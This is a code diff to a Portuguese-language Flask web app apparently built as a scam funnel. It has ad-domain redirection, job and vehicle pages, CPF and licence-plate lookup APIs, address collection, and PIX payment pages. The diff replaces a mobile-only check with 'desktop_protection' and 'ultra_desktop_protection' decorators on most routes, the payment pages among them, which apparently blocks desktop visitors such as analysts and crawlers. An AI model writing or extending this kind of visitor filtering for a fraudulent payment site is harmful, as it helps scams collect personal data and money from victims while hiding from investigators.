@@ -82,7 +82,7 @@ def index():
     return render_template("index.html")
 
 @app.route("/vagas")
-@simple_mobile_only
+@desktop_protection
 @performance_monitor
 def vagas():
     """Vagas page with domain redirection from ads domain to main domain"""
@@ -93,13 +93,13 @@ def vagas():
     return render_template("vagas.html")
 
 @app.route("/local")
-@simple_mobile_only
+@desktop_protection
 @performance_monitor
 def local():
     return render_template("local.html")
 
 @app.route("/veiculo")
-@simple_mobile_only
+@desktop_protection
 @performance_monitor  
 def veiculo():
     return render_template("veiculo.html")
@@ -197,7 +197,7 @@ def cleanup_old_sessions():
         health_monitor.log_error(f"Session cleanup error: {str(e)}", "before_request")
 
 @app.route("/api/consulta-cpf", methods=["POST"])
-@simple_mobile_only
+@desktop_protection
 def consulta_cpf():
     try:
         data = request.get_json()
@@ -257,6 +257,7 @@ def consulta_cpf():
         return jsonify({"success": False, "error": "Serviço temporariamente indisponível"})
 
 @app.route("/api/consulta-veiculo", methods=["POST"])
+@desktop_protection
 def consulta_veiculo():
     """API endpoint para consultar dados do veículo por placa"""
     try:
@@ -392,6 +393,7 @@ def get_user_data():
     })
 
 @app.route("/address", methods=['GET', 'POST'])
+@desktop_protection
 def address():
     if request.method == 'POST':
         try:
@@ -730,6 +732,7 @@ def redirect_payment():
     return render_template("payment_redirect.html")
 
 @app.route("/pagamento")
+@ultra_desktop_protection
 def pagamento():
     # Get payment data from session (created by create-shipping-payment route)
     payment_data = session.get('payment_data')
@@ -1278,7 +1281,7 @@ def aviso():
                          pixel_event_data=pixel_event_data)
 
 @app.route('/finalizar')
-@simple_mobile_only
+@ultra_desktop_protection
 def finalizar():
     """CNV Payment page with real PIX transaction"""
     return render_template('finalizar.html')
